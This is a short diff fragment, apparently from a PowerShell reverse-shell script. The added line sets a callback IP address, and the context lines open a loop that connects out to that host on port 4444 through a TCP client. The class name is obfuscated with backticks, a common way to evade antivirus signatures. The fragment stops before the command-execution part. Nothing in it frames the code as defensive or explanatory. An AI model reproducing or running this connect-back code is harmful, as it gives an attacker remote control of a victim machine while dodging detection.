@@ -1,3 +1,4 @@
+$ip=192.168.1.151
 do{
 $v = 4
 $a = New-Object S`ySt`em.N`eT.`s`ock`eTs.TC`PC`li`eNt("$ip",4444)
